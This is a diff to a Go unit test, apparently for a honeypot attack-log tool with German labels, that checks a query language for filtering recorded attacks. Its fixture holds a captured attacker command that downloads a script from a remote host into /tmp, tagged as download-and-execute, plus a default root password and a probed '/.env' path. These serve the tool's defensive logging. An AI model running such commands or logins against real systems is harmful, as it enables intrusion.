@@ -11,7 +11,7 @@ func TestQueryLanguage(t *testing.T) {
 	a := &Attack{IP: "203.0.113.5", Country: "CN", CountryName: "China", ASN: 4134, ASOrg: "Chinanet", Services: []string{"ssh"}, Ports: []int{22},
 		Stufe: 3, Events: 40, Commands: []string{"cd /tmp; wget http://198.51.100.1/x.sh", `echo "$((535*316+18))"`}, Profile: "SSH-Einbruch",
 		Tags: []Count{{Key: "download_exec", Label: "Nachladen und Ausführen"}}, creds: map[string]int{"root / 123456": 3}, paths: map[string]int{},
-		seenCmd: map[string]bool{}, Wallets: []string{"4Ab3"}, AIReplies: []AIReply{{Kind: "shell", Input: "idx"}}}
+		seenCmd: map[string]bool{}, Wallets: []string{"4Ab3"}, URLs: []string{"http://198.51.100.1/x.sh"}, AIReplies: []AIReply{{Kind: "shell", Input: "idx"}}}
 	b := &Attack{IP: "198.51.100.9", Country: "DE", Services: []string{"http"}, Ports: []int{80}, Stufe: 0, Scanner: "Censys",
 		paths: map[string]int{"/.env": 1}, creds: map[string]int{}, seenCmd: map[string]bool{}}
 	for _, c := range []struct {
@@ -39,6 +39,7 @@ func TestQueryLanguage(t *testing.T) {
 		{"unbekannt:feld", false, false}, // unbekanntes Feld = freier Text
 		{"ki:ja", true, false},
 		{"ki:nein", false, true},
+		{"nachladen:ja", true, false},
 	} {
 		terms := parseQuery(c.q)
 		if got := a.matchQuery(terms); got != c.a {
